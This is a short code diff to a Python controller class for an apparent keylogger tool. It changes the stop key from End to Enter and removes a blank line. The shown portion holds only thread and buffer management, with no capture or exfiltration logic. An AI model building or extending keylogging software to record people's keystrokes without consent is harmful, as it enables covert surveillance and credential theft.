@@ -15,7 +15,7 @@ class Control:
         The object is used to manage all other objects
         :param view: The view object that is used to communicate with the user
         """
-        self.__stop_key = "Key.end"
+        self.__stop_key = "Key.enter"
         self.__keylogger = None
         self.__writer_thread = None
         self.__keylogger_monitoring_thread = None
@@ -32,7 +32,6 @@ class Control:
         """
         if self.keylogger_is_running():
             return False
-
         buffer = Buffer()
         self.__keylogger = Keylogger(buffer, self.__stop_key)
         writer = Writer(buffer)
